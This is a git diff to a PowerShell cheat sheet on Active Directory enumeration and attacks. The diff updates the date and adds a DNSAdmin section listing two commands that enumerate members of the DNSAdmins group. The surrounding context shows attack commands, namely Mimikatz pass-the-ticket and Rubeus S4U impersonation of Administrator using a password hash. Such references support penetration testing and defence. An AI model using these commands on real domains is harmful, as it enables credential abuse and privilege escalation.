@@ -2,7 +2,7 @@
 
 This cheat sheet contains common enumeration and attack methods for Windows Active Directory with the use of powershell.
 
-Last update: **20 Nov 2021**
+Last update: **21 Nov 2021**
 ## TOC
 - [Pre-requisites](#pre-requisites)
 - [Enumeration](#enumeration)
@@ -31,6 +31,7 @@ Last update: **20 Nov 2021**
      -  [Unconstrained Delegation](#unconstrained-delegation)
         -  [Printer Bug](#printer-bug)
      -  [Constrained Delegation](#constrained-delegation)
+  -  [DNSAdmin](#dnsadmin)
 
 ## Pre-requisites
 ### Using PowerView:
@@ -557,4 +558,17 @@ Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
 ```powershell
 # Requesting TGT and TGS
 .\Rubeus.exe s4u /user:<username> /rc4:<hash> /impersonateuser:Administrator /msdsspn:"CIFS/<domain>" /ptt
+```
+
+### DNSAdmin
+
+**1. Enumeration with Powerview:**
+```powershell
+# Enumerate the members of the DNSAdmis group
+Get-NetGroupMember -GroupName "DNSAdmins"          
+```
+**2. With AD Module:**
+```powershell
+# Enumerate the members of the DNSAdmis group
+Get-ADGroupMember -Identity DNSAdmins
 ```
